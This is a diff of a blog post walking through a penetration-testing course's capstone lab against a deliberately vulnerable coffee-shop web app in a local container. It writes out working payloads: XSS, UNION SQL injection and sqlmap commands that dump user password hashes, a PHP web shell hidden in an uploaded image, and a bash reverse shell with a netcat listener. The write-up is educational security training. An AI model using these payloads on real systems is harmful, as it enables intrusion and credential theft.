@@ -1,22 +1,21 @@
 --- 
-title: "Simple Web App Exploit [TCM-Security PEH Capstone]"
-description: "This is a straightforward web application exploit where we will leverage basic web app exploits"
+title: "Basic Web App Exploit [TCM-Security PEH Capstone]"
+description: "This exploit targets a straightforward web application vulnerability, utilizing basic techniques to potentially compromise the host device that runs the application."
 date: 2024-06-25 12:00:00 -100
 image: /assets/images/Coffe Shop/PEH.png
-categories: [CTF, pentest]
-tags: [xss,sql injection,burpsuite]    # TAG names should always be lowercase
+categories: [Vulnerability Assessment, Web Application]
+tags: [arbitrary file upload, burp suite, client-side validation, container, insufficient password security, pentest report, sql injection, sqlmap, xss]    # TAG names should always be lowercase
 ---
 Cover image by [Freepik](https://www.freepik.com/)
 
-_Here we will leverage vulnerabilities in a poorly designed website. The web application lives in a container located on our local machine. As the title says, this is the capstone for TCM-Securities Practical Ethical Hacking course_
+Here we will leverage vulnerabilities in a poorly designed website. The web application resides in a container located on our local machine. As the title indicates, this is the capstone for TCM-Securities Practical Ethical Hacking course
 
-
-Navigating to our localhost/capstone We see the following webpage. 
+Navigating to our localhost/capstone We see the following webpage
 
 ![Image of the website](/assets/images/Coffe%20Shop/Website%20Pic.png)
 _Coffee store application_
 
-Clicking on one of the available items listed allows us to enter a comment. Let's try a basic XSS test
+Clicking on one of the available items listed allows us to enter a comment. Let's try a basic XSS test to test of the application will run arbitrary java script
 
 ```javascript
 <script>alert(1)</script>
@@ -24,13 +23,13 @@ Clicking on one of the available items listed allows us to enter a comment. Let'
 
 ![XSS](/assets/images/Coffe%20Shop/Coffe%20XSS%20example.png)
 
-Great, our first finding is the XSS vulnerability. I also noticed the URL is also may be vulnerable to XSS attacks as it directly reflects what's in the URL
+Great, our first finding is this XSS vulnerability. The URL is also vulnerable to XSS attacks as it directly reflects what's in the URL
 
 ![XSS2](/assets/images/Coffe%20Shop/URL%20Reflected%20back%20at%20us.png)
 
 {% include tip.html content="Input sanitization & encoding user input can help prevent this types of attacks." %}
 
-let's try manipulating the URL with a simple sql injection statement
+This web application must store data in a database. Let's attempt to manipulate the URL with a simple [SQL](https://aws.amazon.com/what-is/sql/) injection statement
 
 ```sql
 coffee.php?coffee=1' or 1=1-- -
@@ -38,7 +37,7 @@ coffee.php?coffee=1' or 1=1-- -
 
 This SQL injection allows us to retrieve all the items from the database
 
-Since 1=1 equates to true we get all the available items. The comment delimiter -- - means that anything after it will be treated as comment and thus ignored
+Since 1=1 equates to true, it allows us to retrieve all the available items. The comment delimiter `-- -` means that anything after it will be treated as comment and thus ignored by the database
 
 ![Simple SQL exploit](/assets/images/Coffe%20Shop/XSS%20Injection%202.png)
 
@@ -52,11 +51,11 @@ We can extract the number of columns using the following line
 coffee=1' union select null,null,null,null,null,null,null-- -
 ```
 
-Since the page still loads, it indicates that **we have confirmed there is indeed 7 columns** and can further exploit the database
+Since the page still loads, it indicates that we have confirmed there is indeed 7 columns and can further exploit the database
 
 ![Confirmed columns](/assets/images/Coffe%20Shop/Confirmed%20number%20of%20columns.png)
 
-After enumerating the number of columns, we need to know what the actual table names are. I opted to just replace null with TABLE_NAME for every column placeholder
+After enumerating the number of columns, we need to know what the actual table names are. I opted to just replace `null` with `TABLE_NAME` for every column placeholder
 
 ```SQL
 1' union select TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-- -
@@ -77,11 +76,11 @@ Let's enumerate the columns as well
 coffee=1'union select COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS-- -
 ```
 
-Important columns obtained 👌
+Critical column names acquired 👌
 
 ![Password](/assets/images/Coffe%20Shop/Password.png)
 
-Let's use the information on our tables and columns to extract the password from the users table
+Let's use the information from our tables and columns to extract the password from the users table
 
 ```SQL
 coffee=1' union select null,username,password,null,null,null,null FROM users-- -
@@ -89,7 +88,7 @@ coffee=1' union select null,username,password,null,null,null,null FROM users-- -
 
 ![password obtained](/assets/images/Coffe%20Shop/Password%20Hashes.png)
 
-Password hashes obtained. Now we need to find out what kind of hash we're dealing with in order to crack them
+Password hashes obtained. Now we need to identify the hash algorithm used to crack them
 
 It looks like both my offline hash cracking tools `hash-identifier` and `hashid` could not identify the hash
 
@@ -120,7 +119,7 @@ We can see from the output that the hash obained from Jeremy `$2y$10$F9bvqz5eoaw
 
 [SQLmap](https://sqlmap.org/) is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications.
 
-To utilize SQLmap, we need to capture the request to the web application. To do this we will use a tool built into Kali called Burpsuite to capture the request, then copy and paste that into a text file called `request.txt`
+To utilize SQLmap, we need to capture the request to the web application. To do this, we will use a tool built into Kali called Burpsuite to capture the request, then copy and paste that into a text file called `request.txt`
 
 ![Request](/assets/images/Coffe%20Shop/Burp%20request.png)
 
@@ -128,7 +127,7 @@ To utilize SQLmap, we need to capture the request to the web application. To do 
 sqlmap -r request.txt --level-2
 ```
 
-The output tells us that the applications coffee parameter is vulnerable to SQL injection and confirmed the back-end DBMS is MySQL. Vulnerabilities include boolean-based blind, time-based blind, and UNION query injection
+The output tells us that the applications coffee parameter is vulnerable to SQL injection and confirmed the back-end DBMS is MySQL. Vulnerabilities include boolean-based blind, time-based blind, and UNION query injection (which we utilized manually earlier)
 
 ![SQL map output](/assets/images/Coffe%20Shop/SQLmap%20output.png)
 
@@ -140,11 +139,11 @@ sqlmap -r request.txt  -T users -dump
 
 ![passwords](/assets/images/Coffe%20Shop/sqlmap%20passwords.png)
 
-Now we have every user & admins hashed password. Since we already cracked jeremy's password earlier. We can just login with that
+We've obtained have every user & admins hashed password. Since we already cracked jeremy's password earlier. We can just login with that
 
 ![Nothing different](/assets/images/Coffe%20Shop/Nothing%20different.png)
 
-We don't immediately see anything different or any type of admin panel available to me so I'm going to run a ffuf scan to enumerate directories
+We don't immediately see anything different or any type of admin panel available, so I'm going to run a ffuf scan to enumerate directories
 
 {% include tip.html content="Enumerate directories before you attempt to exploit to avoid this problem" %}
 
@@ -154,11 +153,11 @@ We don't immediately see anything different or any type of admin panel available
 
 ![ffuf scan](/assets/images/Coffe%20Shop/admin_php.png)
 
-Running the following ffuf scan enumerated `/admin/admin.php` for us. We will login with Jeremy's admin credentials that we obtained earlier and navigate to that 
+Running the following ffuf scan enumerated `/admin/admin.php` for us. We will login with Jeremy's admin credentials that we obtained earlier and navigate to that
 
 ![Add Coffee Page](/assets/images/Coffe%20Shop/add%20new%20coffee.png)
 
-It looks like we have the ability to upload. Let's see what happens when we upload our new coffee item
+It looks like we have the ability to upload. Let's see what happens when we upload our new item
 
 ![MLG Coffee](/assets/images/Coffe%20Shop/MLG%20Coffee.png)
 
@@ -170,7 +169,7 @@ Looks like the image source is `assets/<assetnumber>` From here we will edit the
 
 ![File named changed](/assets/images/Coffe%20Shop/File%20name%20changed.png)
 
-As you can see from the picture above we had to change the file name to a `.php` file so that it would execute our php shell. We added the php reverse one liner that take the parameter from the URL and executes it as a system command on the server. We also had to remove most of the image data below the [magic byte](https://en.wikipedia.org/wiki/List_of_file_signatures) `PNG` to avoid any errors in processing the request
+As you can see from the picture above we had to change the file name to a `.php` file so that it would execute our php shell. We added the php reverse one liner that takes the parameter from the URL and executes it as a system command on the server. We also had to remove most of the image data below the [magic byte](https://en.wikipedia.org/wiki/List_of_file_signatures) `PNG` to avoid any errors in processing the request
 
 ```bash
 <?php system($_GET['cmd']); ?>
@@ -182,7 +181,7 @@ From checking the image source prevously, we will navigate to our image url `url
 
 ![RCE](/assets/images/Coffe%20Shop/RCE.png)
 
-And boom goes the dynimaite, we have RCE. Let's set up our netcat listenr to allow the incoming reverse shell that we're going to set up in a seoncd
+And boom goes the dynimaite, we have RCE. Let's set up our netcat listener to allow the incoming reverse shell that we're going to set up
 
 ```bash
 nc -lvnp 9001
@@ -201,7 +200,7 @@ http://localhost/capstone/assets/21.php?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%
 
 ![Reverse Shell Obtained](/assets/images/Coffe%20Shop/Shell%20obtained.png)
 
-And GG, we have successfully compromsied this container. It's crucial to avoid security vulnerabilites like XSS attacks. The URL & comment section appeared to lack any [input validation](https://www.sciencedirect.com/topics/computer-science/input-validation#:~:text=Input%20validation%20is%20the%20process,standard%20defined%20within%20the%20application.) and should valid the type of input being entered to ensure safe 
+And GG, we have successfully compromised this container. It's crucial to avoid security vulnerabilities like XSS, SQLi, & client-side validation. My full vulnerability report with recommended mitigations can be found below
 
 # Vulnerability Assessment Report
 
